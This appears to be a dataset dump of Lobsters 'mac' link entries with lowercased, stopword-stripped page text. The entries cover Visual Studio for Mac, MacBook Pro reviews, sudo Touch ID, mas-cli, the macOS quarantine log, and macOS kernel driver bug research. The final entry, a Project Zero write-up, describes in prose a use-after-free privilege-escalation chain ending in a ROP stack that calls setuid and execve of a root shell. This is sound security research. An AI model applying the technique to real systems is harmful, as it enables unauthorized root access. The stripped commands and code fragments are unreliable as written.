except addition switching project run also create customnamed set run option center toolbar notification area show message various operation building restoring nuget package running operation cancel button show notification area also notification software update displayed click notification build error bring pad information right toolbar global search addition helping find thing like command file solution camelcase filtering system make excellent way quickly activate command jump file type solution even kick find file search solution open nuget package manager search package solution pad work much solution explorer visual studio letting explore manage structure solution project file context menu give range contextspecific command item solution tree adding removing file project editing project reference opening terminal window folder building debugging specific project error pad show build warning error also find build log output split view unlike visual studio single unified pad kind output example application output pad show output app run debug log nuget operation shown nuget console pad property pad contextually show property whatever currently focused selected used view change build action file solution pad center heart ide source editor feature expect member visual studio family figure show c intellisense syntax highlighting net core project also code folding live underlining error suggestion type configurable automatic formatting code navigation command array powerful refactoring tool figure intellisense net core project functionality enabled default tweak visual studio mac setting preference dialog accessible mac application menu equivalent option dialog visual studio tool menu contains plenty option help customize ide work way want unit testing supported using nunit test runner plugged via extension test discovered assembly shown unit test pad accessed view pad menu also git version control integrated right source editor row tab along bottom editor access current log diff blame view like get speed quickly tip trick encourage watch xamarin studio session xamarin evolve xmnioxsexpert content applies directly visual studio mac open source core like xamarin studio visual studio mac based open source monodevelop ide actively developed microsoft written entirely c rich extensibility model use add functionality ranging simple editor command entirely new language project type even core feature c editing xamarinios xamarinandroid aspnet core implemented extension like visual studio visual studio code c support visual studio mac powered open source roslyn compiler platform get exact intellisense experience familiar visual studio well support ineditor live analyzer code fix visual studio mac even includes refactoring essential collection analyzer code fix default visual studio mac support editing wide range language though use textmate bundle provide syntax highlighting simple intellisense includes number open source textmate bundle visual studio code creating aspnet core app show easy get speed visual studio mac going walk though creating simple aspnet core back end hypothetical todo mobile app allows multiple user add item user see item post please note writing article using prerelease version visual studio mac detail ui may change release however approach concept discussed article still apply installing opening visual studio mac start clicking new solution button welcome page open new project dialog navigate cloud section choose aspnet core web application template click next choose web api template web api template creates restful web service perfect mobile back end though add view project later create web front end finally name project hellovsmac click create visual studio mac creates project using dotnet templating engine open start restoring nuget package depends open project file editor using tool edit file context menu project solution pad see minimalistic msbuildbased project file intended easy understand edit directly save ide automatically reload modified version looking project solution pad key item package nuget package dependency aspnet core net core framework msbuild target build project installed via nuget package programcs entry point web app aspnet core apps program main method entry point creates build run webhost heart app startupcs defines startup class passed webhost class contains initialization method appsettingsjson configuration setting aspnet core equivalent aspnet webconfig purpose walkthrough leave look valuescontrollercs file view folder contains valuescontroller class registered route api controller route controller placeholder class name really apivalues route start defining simple todoitem class todolist storage class todolist static shared among request real app use database also rename controller class todocontroller make route apitodo connect get post method store clear unused controller method result seen figure figure controller simple shared todo list storage route api controller public class todocontroller controller â httpget â public ienumerable todoitem get â â â â return todolistgetall â â httppost â public void post frombody todoitem item â â â â todolistadd item â public class todoitem â public string title get set public static class todolist â static list todoitem list new list todoitem â public static void add todoitem item â â â â lock list listadd item â â public static ienumerable todoitem getall â â â â lock list return listtoarray â complete small restful web service try place breakpoint post method start debugging app output pad start show output aspnet core builtin kestrel web server app start default port anything else receives request open web browser check empty array figure debugging net core project mobile client service yet time open macos terminal app use curl send post request app curl h contenttype applicationjson x post title build â mobile app trigger breakpoint debugger inspect value automatically parsed json body request converted todoitem object see visual studio mac automatically entered debugging layout debugger pad expect stack local thread breakpoints go back terminal use curl access get method see json array containing item added curl title build mobile app next step build mobile app let explore indepth information aspnet core recommend checking aspnetgetstarted like learn xamarin development plenty great material developerxamarincom although much documentation visual studio mac yet xamarin studio documentation applies directly case visual studio documentation often applicable wrapping hope brief overview whetted appetite try visual studio mac make macos ide choice cloud mobile development mac encourage download preview visualstudiocom give spin let u know like excited hear feedback help guide preview beyond mikayla hutchinsonâ senior program manager xamarin platform microsoft previously developed mobile web tooling xamarin studio core developer monodevelop follow twitter mjhutchinson thanks following microsoft technical expert reviewing article larry lluis sanchez larry obrien work xamarin documentation group microsoft long active software development publication field author editor discus article msdn magazine forum
501,Lobsters,mac,Apple macOS,Veertu - Run Windows and Linux on your Mac,https://veertu.com/,veertu run window linux mac,macos cloud io ci devops anka build configure macos cloud run io ci pipeline anka flow io developer develop consistent local environment complete security uncompromised productivity enterprise mac client,macos cloud io ci devopsanka build configure macos cloud run io ci pipelinesanka flow io developer develop consistent local environment complete security uncompromised productivity enterprise mac client
502,Lobsters,mac,Apple macOS,The 2016 MacBook Pro,https://jcs.org/notaweblog/2016/11/08/the_2016_macbook_pro/,macbook pro,android rom pushover lobster garbage openbsd development complaining samsung ativ book chromebook pixel compromise stranger compromise new compromise development environment text editor remote server little wing lost optical output lower price startup chime party software many compromise product,using macbook air primary computer six year great computer satisfied lot requirement laptop thin lightweight small form factor excellent keyboard touchpad mostly silent atom core processor done lot little computer like compiling maintaining android rom writing rail io android apps pushover creating lobster recording editing episode garbage lot openbsd development current model macbook air core ram ssd terrible spec unless one complaining new macbook pro ram run text editor written javascript recently bumping limit would run disk space editing large podcast episode audacity nonretina screen started feel bit cramped xcode certainly using hidpi screen samsung ativ book chromebook pixel ruined nonhidpi screen compromise retina macbook came bought hoping retain form factor air get larger higher resolution display unfortunately returned short disliked keyboard much key travel shallow would bottom much key press causing pain finger basic premise macbook felt like big compromise willing put lack port uncomfortable keyboard could get something small lightweight return stranger compromise one willing make primary workstation wwdc came went mention updated mac anxiously awaited next apple event see would replace air first photo new macbook pro disappointed see adopted terrible keyboard macbook replaced physical escape key touchbar air typically cheaper mac laptop cost material like screen watched october keynote hoping touchbar keyboard mess would confined pro leaving air spec bump retina screen demo touch bar made seem completely impractical anything adjusting screen brightness volume see posture awkward look hunched trying peck tiny screen finger thought dj actually using tiny bar produce music instead physical drum machine laughing touch bar seems like poor solution problem one keynote dragged learned air get retina update completely discontinued air get update probably discontinued soon well good news new macbook pro would available physical function escape key would considered lowend model weaker spec thunderboltusbc port since clear upgrade path narrowed basically one machine ordered model physical function key ram ssd usbc lightning cable course could actually io development new compromise used new macbook pro couple day like macbook ended returning keyboard better macbook still represents compromise willing make cobbling together email reply coffee shop professional software developer job requires ton typing every day development environment completely keyboarddriven text editor completely keyboarddriven work remote server entirely keyboarddriven need keyboard work reliably need able make keystroke include arrow key key modifier escape etc accurately want keyboard work without thinking change typing habit depending computer macbook keyboard none key low travel result hollow unreassuring feedback typing since key close together also short hard find accessory key like arrow backspace quickly feel macbook pro macbook pro aside keyboard macbook pro also introduces number compromise magnetic magsafe power connector gone replaced allpurpose thunderboltusbc port stranger usbc chromebook pixel charge via usbc still take proprietary magsafe standard usbc charger day losing magsafe also take led connector let know laptop finished charging without power unlock new usbc power brick come macbook pro also loses little wing serve wrap rest cord neatly much said elsewhere dongle required new macbook pro since touchbar model usbc port nothing else displayport hdmi usba sd card slot bother much since rarely use port desk understand apple include least one usba port first model year transition tried reason apple included legacy port customer would never transition usbc seems silly chromebook pixel two usba two usbc connector use accessory type conveniently pixel usbc port side allowing charged either port depending laptop sitting relation wall wart macbook pro model got usbc port left side nothing headphone jack right side also lost optical output lose magsafe least give convenience able charge side iphone headphone port lightning port macbook pro came headphone port lightning port connecting iphone new macbook pro required anyone io development requires new cable since one included iphones usba mess apple eventually lower price adapter many people complained could included basic one like usba usbc box especially given high price pretty standard pc manufacturer include adapter nonstandard port thing like video ethernet remember iphone actually came dock box apple finally removed startup chime something party software year made automatically power lid opened like chromebooks welcome change new retina display brighter previous one certainly welcome upgrade display air get model touch bar predict end like force touch touch iphone extra feature developer write clever functionality user hardware available want use developer rely used critical even routine functionality application always additional way triggering functionality hardware touch touch bar aside showing demo video get widely used novelty wear user go back using keyboard touchpad many thing still need done touch id sensor addition nice though think use much since would prefer keep mac locked passphrase see photo touch bar use note software escape key shown touch bar always offset right quite bit touch display actually extend way right touch id sensor symmetry apple made extend way left either rather leave blank space touch bar apple put physical key width touch id know like escape key right escape key many compromise main gripe macbook pro many compromise unnecessary macbook air close make difference thickness new macbook pro yet air fulldepth keyboard butterfly keyboard macbook pro created solve problem fit stuff underneath thinner laptop created superior keyboard yet found way macbook pro let apple shave millimeter height touchpad comically large get touched typing anyone complaining touchpad large enough pro two thunderboltusbc port able fit four exact enclosure version implying purely costsaving measure laptop still cost said still position needing new mac returning macbook pro anyone say ditched apple got better laptop different vendor make living developing product io app tied mac platform much work quick comparison macbook pro predecessor showed spec appreciably different term performance storage ram screen resolution etc would still retain great keyboard magsafe accessory port macbook air macbook pro macbook pro bought macbook pro core ram ssd happily typing terribly happy buy oneandahalf year old computer pay price model performance knowing could bought exact computer year half ago came instead wait time air least happy type
503,Lobsters,mac,Apple macOS,Apple’s Lenovo,http://furbo.org/2016/11/05/apples-lenovo/,apple lenovo,selling pc business selling printer output adobe buy printer apple logo described marco arment said best licensing hackintoshes,bring longterm value client company need continually reinvent quote come ibm announcement selling pc business ibm business moving towards service le dependent hardware sale still needed hardware provide service client deal let ibm focus future lenovo got thinkpad brand engineering talent sale channel one rare winwin scenario teach business school apple stranger reinventing thirty year ago selling printer beautiful device produced stunning output launched desktop publishing revolution established adobe central figure software ecosystem today buy printer apple logo someday soon look back wistfully beautiful display apple used make announcement new lg partnership display seeing another part apple business outsourced maybe time apple thing mac pro business described marco arment like ibm apple bind future bulk revenue depend mobile device yet make product without horsepower provided mac besides apple internal need many professional creating content mobile device folk need fast capable computer create apps music video need powerful mac enrich mobile ecosystem john gruber said best heaviness mac allows io remain light io pick heavy load end decade see happening work licensing operating system disaster apple professional customer time build maintain hackintoshes partnership build mac hardware would need structured benefit apple partner customer alike like ibm client benefitted lenovo
504,Lobsters,mac,Apple macOS,Nyancat on the Touchbar,https://github.com/avatsaev/touchbar_nyancat,nyancat touchbar,join github today sign file permalink touchbar nyancat video download awesome touchbar apps resource reload reload,stupid nyancat animation macbook pro touchbar dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time touchbar nyancat stupid nyan cat animation macbook pro touchbar enjoy video download awesome touchbar apps stupid nyancat animation macbook pro touchbar resource perform action time signed another tab window reload refresh session signed another tab window reload refresh session
505,Lobsters,mac,Apple macOS,New MacBook Pro not compatible with all Thunderbolt 3 devices,http://www.macrumors.com/2016/11/03/new-macbook-pros-thunderbolt-3-compatibility/,new macbook pro compatible thunderbolt device,plugable plugable,apple new macbook pro appear incompatible thunderbolt device use controller chip texas instrument meaning early thunderbolt product may work new machine incompatibility discovered plugable via found graphic adapter compatible apple new macbook pro use controller chip texas instrument result plugable postponing upcoming docking station work compatibility solution update apple chosen prevent thunderbolt device using currently available controller chip texas instrument enumerating functioning macbook pro current thunderbolt peripheral use controller chip incompatible new thunderbolt macbooks knowledge includes currently available thunderbolt device including graphic adapter thunderbolt cable require chip therefore compatible made difficult decision postpone docking station evaluate necessary make docking station macbookcompatible flagship dock power deliverycharging using next generation controller chip ti compatible thunderbolt macbooks existing soontobe available thunderbolt accessory may compatible new macbook pro customer looking purchase dock adapter product double check manufacturer ensure compatibility many product horizon newer thunderbolt chipsets wo nt affected also possible apple could push firmware update add support accessory older texas instrument controller update plugable provided macrumors information thunderbolt accessory supported macbook pro version o x new macbook pro late work existing certified thunderbolt dock adapter released prior november existing device use intel thunderbolt chipset alpine ridge combination first generation ti usbc chipset apple requires generation chipset peripheral compatible certification solution across different device type still inprogress generation chipset plugable product line dual display graphic adapter displayport hdmi affected disabled o x new macbooks offer product windowsonly thunderbolt device future hardware update thunderbolt cable require chip therefore compatible also made difficult decision postpone docking station update chipset recertify make docking station macbookcompatible flagship dock power deliverycharging already planned use next generation controller chip ti compatible thunderbolt macbooks
506,Lobsters,mac,Apple macOS,Darling - a macOS translation layer for Linux,https://www.darlinghq.org/,darling macos translation layer linux,darling wine anbox issue opensourceapplecom apportable foundation documentation blog github,uname linux darling shell darling uname darwin darling darling translation layer let run macos software linux fast darling run macos software directly without using hardware emulator free like linux darling free opensource software developed openly github distributed gnu gpl license version compatible darling implement complete darwin environment mach dyld launchd everything expect easy use darling setup sit back enjoy using favorite software native aim fully integrate apps running darling linux desktop experience making look feel behave like native linux apps sound lot like wine wine let run window software linux darling macos software another similar project anbox android apps support gui apps almost took u lot time effort finally basic experimental support running simple graphical application requires special setup though expect work box yet working stay tuned violate apple eula directly use part darwin released fully free software name darling mean anything name darling combination darwin core operating system macos io based run darling window using wsl unfortunately darling requires real linux kernel run see issue detail know opensourceapplecom gnustep cocotron project fact darling largely based original darwin source code published apple use cocotron basis cocoa implementation along apportable foundation various bit gnustep plan supporting io apps yes long run like able run io apps arm device like android phone significant challenge would write implementation uikit come talk u interested working contribute start reading documentation blog get familiar darling internals come join u github great experience developing macos io absolutely required start contributing
508,Lobsters,mac,Apple macOS,Why it’s healthy that Microsoft and Google are eating Apple’s lunch,https://cpbotha.net/2016/11/02/why-its-healthy-that-microsoft-and-google-are-eating-apples-lunch/,healthy microsoft google eating apple lunch,disappointed happening apple short post verge privacyconscious giphy support another friend wonderfully capricious human emotion interfering machine capitalism,last week apple announced new macbook pro laptop great innovation word sliver touch screen keyboard able show touchable contextspecific button dubbed touchbar although oled technology certainly pretty one could almost hear enormously disappointed collective uttered million user suddenly erstwhile apple fan worldwide apple form phil schiller really trying sell way represent apple company traditionally known great design sensibility spend little money dress little better couture equivalent old lada suit man phil schiller suiting collectively internet disappointed touch screen new imac last refresh year ago mac pro last refresh year ago happening apple day october microsoft revealed surface studio watch introduction video also video withâ microsoft partner secret working studio video even didâ like microsoft get good sense emotion around new product managed make something speaks imagination see outspoken microsoft critic get distinct feeling surface studio physical artefact science fiction dream reality gradually pleasingly turning le nerdy technologycritical better first reaction get seems microsoft convincingly outappled apple word microsoft somehow become sexy whilst apple seems developed strong feeling lada interesting related tidbit friend trying convince get new pixel xl phone reason recently sent short post verge vlad savov camera phone expert recently educated opinion iphone still king smartphone castle writes basis extended experience pixel consider allaround better phone iphone final exhilarating straw broke back photo coming straight pixel camera undoctored horizon adjustment heaven happening whole world collapsing perhaps signal app conversation really use signal privacyconscious giphy support another friend realised happening fact wonderfully capricious human emotion interfering machine capitalism left device nature capitalism mean successful company tend evolve capitalistically optimal dead end word large successful company lose innovate becauseâ realise able make money le risk simply rocking boat instead investing innovation invest sale marketing milk large customerbase ironically steve job explained idea quite eloquently duringâ interview talked decline xerox video fortunately company like microsoft throw innovation curveball appeal emotion imagination rock boat everyone even although talking three absolute behemoth gratifying well theirâ smaller competitor keep toe fickle wonder human behaviour hoping ai never manages model predict precious caprice
511,Lobsters,mac,Apple macOS,Interview Jim Reekes: creator Mac startup sound,https://www.youtube.com/watch?v=QkTwNerh1G8,interview jim reekes creator mac startup sound,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature interview jim reekes creator mac startup sound youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature interview jim reekes creator mac startup sound youtube
512,Lobsters,mac,Apple macOS,Benjamin Button Reviews The New MacBook Pro,https://blog.pinboard.in/2016/10/benjamin_button_reviews_the_new_macbook_pro/,benjamin button review new macbook pro,benjamin button review new macbook pro october,benjamin button review new macbook pro new macbook pro show apple finally becoming serious developer gone gimmicky touchbar gone four usbc port forced power user carry suitcase full dongle place get cornucopia developerfriendly port two usb thunderbolt port redesigned power connector longawaited hdmi port photographer rejoice surprising welcome addition sdxc card reader sign apple might thinking seriously photography new magsafe connector bit apple design genius charging cord stay seated securely pop right yank worry destroying laptop accidentally kicking cord nt changed apple kept beautiful retina display storage memory new machine slightly thicker accomodate usb port gram heavier clear affect battery life interestingly apple removed fingerprint reader associated dedicated chip perhaps assuming developer would comfortable machine nt fully control obvious change redesigned keyboard removing touchbar creates room row physical function button nice touch escape key nt perfect solution function button map confusing series action send window flying around screen errant keystroke new physical switch close backspace key certainly huge step forward interesting see software developer take advantage clever new feature everything new machine seems designed typist trackpad made smaller le likely brush palm key much comfortable type improved key travel softer feel satisfying tactile feedback longer feel like tapping glass surface ipad touchbar mean longer look hand time despite many improvement apple actually dropping price flagship macbook pro another sign serious winning developer release encouraging sign life apple whose product seen significant change since company introduced separate operating system laptop even speculation apple may refresh antiquated mac pro desktop mac neither updated since release rumor also swirling company add headphone jack already popular iphone announcement could come early month october
513,Lobsters,mac,Apple macOS,Touch ID Support for `sudo` in MacOS Terminal,https://github.com/mattrajca/sudo-touchid,touch id support sudo macos terminal,sudotouchid screenshot warning building build running installing,sudotouchid sudotouchid fork sudo touch id support macos powered localauthentication framework compiled allow authenticate sudo command touch id terminal supported mac late macbook pro screenshot warning security expert using fun experiment personal computer security need may vary tested macbook pro touch bar running macos building build sudotouchid simply open included xcode project file xcode select build target click build running try running newlybuilt sudo executable get error sudo must owned uid setuid bit set fix use system sudo command chownchmod command give newlybuilt sudo permission need cd builtproductsdirectory sudo chown root wheel sudo sudo chmod sudo try running copy sudo work cd builtproductsdirectory sudo nt mac biometric sensor sudotouchid fail still like test whether localauthentication framework working correctly change kauthpolicy constant lapolicydeviceownerauthentication sudopluginssudoersauthsudoauthm present dialog box asking user password useful practice use verify localauthentication code fact work installing replacing system sudo program quite risky prevent mac booting requires disabling system integrity protection aka rootless instead replacing sudo install build usrlocalbin give path precedence usrbin way build found first sudo cp builtproductsdirectory sudo usrlocalbinsudo sudo chown root wheel usrlocalbinsudo sudo chmod usrlocalbinsudo set path adding export pathusrlocalbin path bashrc thanks edenzik able enter sudo terminal iterm window authenticate touch id
514,Lobsters,mac,Apple macOS,Mac App Store command line interface,https://github.com/mas-cli/mas,mac app store command line interface,mascli install homebrew homebrew macports macports older macos version custom homebrew tap known installation issue macos ma swift runtime support command line tool github release github release usage signin homebrew integration homebrewbundle homebrewbundle something nt work file bug using wrapper tool exists build source test quick license argon mit license,mascli simple command line interface mac app store designed scripting automation install homebrew homebrew preferred way install macports macports work well note macos mojave required install ma macports core homebrew formula older macos version provide custom homebrew tap prebuilt bottle macos version since install ma tap brew install masclitapmas known installation issue macos starting ma get error similar dyld symbol found running ma need install swift runtime support command line tool alternatively update macos later install xcode later applicationsxcodeapp rebuild ma source using xcode later github release alternatively binary available github release usage application mac app store product identifier also used mascli command using ma list show installed application product identifier ma list screen pixelmator xcode possible search application name using ma search search mac app store return matching identifier include price flag include price result ma search xcode xcode doc xcode dash api doc snippet integrates xcode alfred textwrangler many install update application simply run ma install application identifier ma install downloading paintcode installed paintcode want install first result search command return use lucky command ma lucky twitter downloading twitter installed twitter please note command allow install even purchase app first time use purchase command case ma purchase downloading gapplin installed gapplin please note may reauthenticate app store complete purchase case application free configured account remember credential free purchase use ma outdated list application pending update ma outdated xcode screen vnc access computer anywhere ma able installupdate application listed mac app store use softwareupdate utility downloading system update like itunes xcode command line tool etc install pending update run ma upgrade ma upgrade upgrading outdated application xcode screen vnc access computer anywhere downloading xcode installed xcode downloading iflicks installed iflicks update performed selectively providing app identifier ma upgrade ma upgrade upgrading outdated application xcode downloading xcode installed xcode signin sign mac app store first time run ma signin ma signin ma examplecom signing apple id ma examplecom password due breaking change underlying api ma us interact mac app store signin command temporarily disabled macos information issue see experience issue signing way ask signin using graphical dialog provided mac app store application ma signin dialog ma examplecom signing apple id ma examplecom also embed password command ma signin ma examplecom gzf signing apple id ma examplecom use ma signout sign mac app store homebrew integration ma integrated homebrewbundle ma installed run brew bundle dump mac app store apps included brewfile created see homebrewbundle doc detail something nt work see error redownload available apple id either bought different user item refunded cancelled probably nt installed app app store yet see ma nt work expected eg ca nt updatedownload apps run ma reset try issue persists please file bug feedback much appreciated using tmux ma operates via system service mac app store exist separate process communication xpc result ma experience similar problem pasteboard running inside tmux wrapper tool exists fix pasteboard behaviour also work ma consider configuring tmux use wrapper wish used oneoff basis follows brew install reattachtousernamespace reattachtousernamespace ma install build source build xcode opening masclixcodeproj terminal build output found build directory within project test test project recent workinprogress since xcode officially support test commandline tool target logic part maskit target test maskittests test written using quick license mascli created argon code mit license
515,Lobsters,mac,Apple macOS,Hey Mac - I don't appreciate you spying on me! (Hidden Downloads Log in OS X) - Articulating ideas,http://www.zoharbabin.com/hey-mac-i-dont-appreciate-you-spying-on-me-hidden-downloads-log-in-os-x/,hey mac nt appreciate spying hidden downloads log o x articulating idea,o x terminal iterm post osxdaily mac o x feature application extended attribute file quarantine turned apps official userfacing documentation file quarantine o x tracking use automator schedule delete script symlink devnull sqlite table application bundle name like,month ago switched mac tired backpain carrying heavy ugly lenovo laptop computing power current macbook air lately learning way mac cygwin user felt home o x terminal use iterm interesting thing find cruising web searching o x tip trick today came across post osxdaily discussing mac o x feature launch service keep track downloads history excluding application apple deems safe app store outlook regardless privacy setting application mode eg chrome incognito safari private browsing seems responsibility application report file downloads o mark file extended attribute potentially unsafe present alert example application downloaded internet sure want open apparently marking file extended attribute enough security feature apple decided also keep log dating back downloaded file sqlite db o x use show download url alert window file executed keep information downloads kind application skype cyberduck email browser mechanism supposed protect u user form unintentional execution malware apple seem mind db continue collect data even file quarantine turned file apps apparently news mac world disturbing lack official userfacing documentation form apple topic even apple link file quarantine o x lack userfacing feature disable behavior seems like complete disregard fact become serious privacy issue computer indeed exposed oh irony view following file favorite xml viewer systemlibrarycoreservicescoretypesbundlecontentsresourcesexceptionsplist learn o x also blacklist application forcing lsfilequarantineenabled importantly o x purge log even cleared log cache application db keep growing forever much application responsibility report imho serious privacy violation apple user made aware tracking even userfacing way canceling totally secure could access file even without sudo file never purged would o x need download info forever tracking command refer o x little sqlite bash command print tracked downloads apps downloaded ordered download date grep end little coloring separator librarypreferencescomapplelaunchservicesquarantineeventsv select lsquarantineagentname lsquarantinedataurlstring date lsquarantinetimestamp unixepoch downloadeddate lsquarantineevent order lsquarantinetimestamp sort grep color pipe additional grep handy filter downloads per application per domain search specific file yes filter using inside sql grep also color search term librarypreferencescomapplelaunchservicesquarantineeventsv select lsquarantineagentname lsquarantinedataurlstring date lsquarantinetimestamp unixepoch downloadeddate lsquarantineevent order lsquarantinetimestamp sort grep kalturaorg grep color enough clean file run delete query rebuild db confirm full deletion librarypreferencescomapplelaunchservicesquarantineeventsv delete lsquarantineevent librarypreferencescomapplelaunchservicesquarantineeventsv vacuum stop happening either use automator schedule delete script delete file create symlink devnull sqlite table make go forever know existence file also used retroactive find field db table meaning librarypreferencescomapplelaunchservicesquarantineeventsv schema lsquarantineevent investigating source file systemlibraryframeworkscoreservicesframeworkframeworkslaunchservicesframeworkheaderslsquarantineh lsquarantineeventidentifier unique id record lsquarantinetimestamp time second since lsquarantineagentbundleidentifier downloading application bundle name lsquarantineagentname application name lsquarantinedataurlstring url file downloaded lsquarantinesendername name person sent email downloaded attachment lsquarantinesenderaddress email person sent email downloaded attachment lsquarantinetypenumber enum identifying type application downloaded file value one following url scheme http download set otherwise anything identified supposedly email attachement able reproduce supposedly download instant messaging app able reproduce skype download logged klsquarantinetypeotherdownload ical file via email able reproduce able reproduce lsquarantineorigintitle info seemed always empty log lsquarantineoriginurlstring url resource originally hosting quarantined item user point view web downloads property url web page user initiated download attachment property url resource quarantined item attached eg email message calendar event etc origin url may file url local resource custom url quarantining application respond asked open quarantining application respond displaying resource user note origin url set data url quarantining application may start downloading file user choses view origin url resolving quarantine warning lsquarantineoriginalias info seemed always empty log mac month already showing interesting story personal downloads trail maybe followup post statistic analytics site file type source etc till next time find time write discover surprising personal downloads trend like like loading
516,Lobsters,mac,Apple macOS,[RuxCon / EkoParty 2016] Strolling into Ring-0 via I/O Kit Drivers,https://speakerdeck.com/patrickwardle/o-kit-drivers,ruxcon ekoparty strolling via io kit driver,,due recent macos security enhancement system integrity protection signed driver requirement root order fully mac one generally need code execution worry though seem many kernellevel vulnerability apple party driver talk provide practical reversing engineering io kit driver order search bug starting io kit basic talk illustratively walk thru discovery nowpatched found audit common io kit driver specifically first explore reverseengineer target io kit driver interface order connect driver identify audit method user input processed finally detail subtle bug control rip discussed tangential topic explored along way macos kernel debugging macos specific antidebugging mechanism employed product discovery core macos kernel implementation bug initially prevented exploitation io kit driver bug thru talk attendee gain enhance knowledge foundation macos kernel io kit reversing armed knowhow io kit driver remain safe
517,Lobsters,mac,Apple macOS,MacBook Pro [New 2016 Edition],http://www.apple.com/macbook-pro/,macbook pro new edition,find card,find card get daily cash apple card get special financing learn
518,Lobsters,mac,Apple macOS,Apple Keynote October 2016,http://www.apple.com/apple-events/october-2016/,apple keynote october,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
519,Lobsters,mac,Apple macOS,task_t considered harmful,https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html,taskt considered harmful,,posted ian beer project zero post discus design issue core xnu kernel power io macos apple shipped two iteration mitigation followed yesterday large refactor macos look bug exploited escape sandbox escalate privilege defeat mitigation every step accompanied working exploit background mach port mach port multiplesender singlereceiver message queue maintained kernel special mach port provide messagepassing api userspace message sent handled synchronously kernel message handler sense message sent port quite lot like syscalls task port example kind port handle message allow sender manipulate virtual memory task gain access thread task process task port mig name tool used generate serialization code used kernelowned message port lowlevel look iokit create new iokit user client userspace normally call method iokitlib kernreturnt ioserviceopen ioservicet service taskportt owningtask type ioconnectt connect ioserviceopen call mig generated serialization code ioserviceopenextended ipc method sends serialized message provided ioservice port machmsg mach trap notice port owned kernel call correct kernel mig handler message rather queuing onto port message queue task port passed called owningtask name used throughout userspace kernel code name first thing made suspicious owningtask implies ownership relationship might lead kernel extension developer believe behind scene iokit actually maintaining ownership relationship ensure lifetime userclient always dominated lifetime owningtask dangerous assumption blog post really fallout questioning assumption let keep following flow code kernel snippet kernelside mig deserialization code ioserviceopenextended miginternal novalue xioserviceopenextended machmsgheadert inheadp machmsgheadert outheadp owningtask convertporttotask owningtaskname retcode isioserviceopenextended service owningtask connecttype ndr iobufptrt propertiesaddress propertiescnt outp result connection taskdeallocate owningtask kernel already copiedin right contained message owningtaskname actually pointer struct ipcport mach port name seen userspace convertporttotask taskt convertporttotask ipcportt port taskt task tasknull ipvalid port iplock port ipactive port ipkotype port ikottask task taskt port ipkobject assert task tasknull taskreferenceinternal task ipunlock port return task check port argument really task port object take reference task calling taskreference return taskt pointer taskt typedef pointer struct task see code referencecounted object isisserviceopenextended anything owningtask passing newuserclient re service newuserclient owningtask void owningtask connecttype propertiesdict client newuserclient ioservice method overridden ioservice want offer multiple userclient type otherwise default implementation look ioservice iouserclient subclass class name iokit registry allocate via iokit reflection api call initwithtask method default implementation initwithtask also anything owningtask looked code far look like case default owningtask going hold reference userclient would prevent userclient taking reference task causing reference cycle fact clearly quite opposite userclient must take reference owningtask wish keep reference owningtask implicit ownership relationship checking doc whole lot resource writing o x kernel extension apple publish sample kext developer site called applesamplepci provides example various iokit design pattern applesamplepcikext implementation initwithtask bool samplepciuserclientclassname initwithtask taskt owningtask void securityid type osdictionary property bool success super initwithtask owningtask securityid type property ftask owningtask fdriver null return success sample userclient store owningtask argument ftask member variable without taking reference without reference guarantee task struct pointed ftask freed method return looking rest sample kext see external method use ftask pointer create memory descriptor get task struct pointed ftask freed using dangling pointer opening handful o x kexts ida pretty clear lot follow antipattern holding taskt pointer without taking reference creating dangling taskt mach message provide flexible powerful ipc building block one neat thing send process sendrights mach port hold send receive right task port give complete control task api request task port another task taskforpid privileged since task send right task port code execution two task send sendright second task task port first case use technique outlined robert sesek create shared mach port parent forked child stashing sendright bootstrapport special port slot fork child recover stashed port restore bootstrap port set bidirectional ipc channel send task port back parent triggering uaf vulnerable antipattern look like parent fork child child sends task port back parent child spin parent receives child task port creates vulnerable iokit userclient passing child task port owningtask parent destroys send right child task port parent kill child freeing task struct child parent userclient dangling task struct pointer first exploit looking iokit driver bug one jumped particularly interesting iosurfacerootuserclient apple developer doc say iosurface iosurface framework provides framebuffer object suitable sharing across process boundary commonly used allow application move complex image decompression draw logic separate process enhance security reality iosurfaces wrapper around shared memory buffer o x talk iosurface kernel extension inside safari renderer sandbox chrome gpu sandbox amongst others iosurfacerootuserclient class exactly antipattern saw applesamplepci client userclient store copy owningtask pointer member variable without taking reference reversing tell u external method iosurfacerootuserclient createsurface take dictionary keyvalue parameter used create shared memory object process map address space passing following key value get iosurfacerootuserclient wrap existing userspace page iosurface rather allocating new buffer iosurfaceaddress baseaddress iosurfaceallocsize size iosurfaceisglobal true iosurface object actually wrap iomemorydescriptor allocated iosurface allocate calling iomemorydescriptor iomemorydescriptor withaddressrange machvmaddresst address machvmsizet length iooptionbits option taskt task final taskt task argument iomemorydescriptor withaddressrange defines task virtual memory descriptor created iosurface pass member variable storing copy owningtask hold reference get task struct memory freed original task exiting reallocated another task starting used task struct privileged task iomemorydescriptor believe wrapping portion current process address space actually wrapping portion privileged task virtual memory iomemorydescriptor back iosurface setting iosurfaceisglobaltrue make surface available process calling external method lookupsurface another iosurfacerootuserclient created legitimate task port owningtask build primitive allows u map arbitrary portion process address space since iomemorydescriptor actually creating shared memory mapping page write writes also reflected process iosurfacerootuserclient allow u map executables page victim still map example data segment library made easier shared library cache virtual address process putting exploit together need way get task struct reused privileged process need something overwrite target get code execution task structs allocated kernel heap zone greatly simplifies thing kill child fork exec suidroot binary likely reuse memory pointed dangling taskt overwrite target chose target cleanup pointer libc called process exit play trick block binary exit setting stderr file descriptor full pipe forcing write error message giving u plenty time exploit bug parent process overwrite cleanup pointer emptying pipe parent chose point function pointer gadget add large constant rsp return move stack pointer argv since exec ed binary put simple rop stack call setuid execve binbash rop payload prefixed large number retslide gadget stable across version o x since bug also allows u gain entitlement want well root easy use defeat kernel code signing o x load unsigned kernel extension see exploit one way although exploit us fork execve actually required prerequisite triggering bug need code execution two cooperating process send mach message particular bug able talk iosurface damien deville blog post discussing way achieving within app sandbox io using application group also necessary exec suidroot binary could cause freed task struct reused another privileged task looking mach service via launchd deliberately crashing causing launchd run crashreporter many individual instance bug fixed o x apple shipped mitigation prevent passing task task port certain iokit method stepping back useafterfree bug quite fun obscures far deeper concerning issue iosurfacerootuserclient call taskreference owningtask owningtask original creator userclient still bug earlier year osxreverser independently published research problem execve syscall case race condition due order execve performed certain operation loading suid binary left small race window new memory map created old task port invalidated far fundamental problem execve syscall 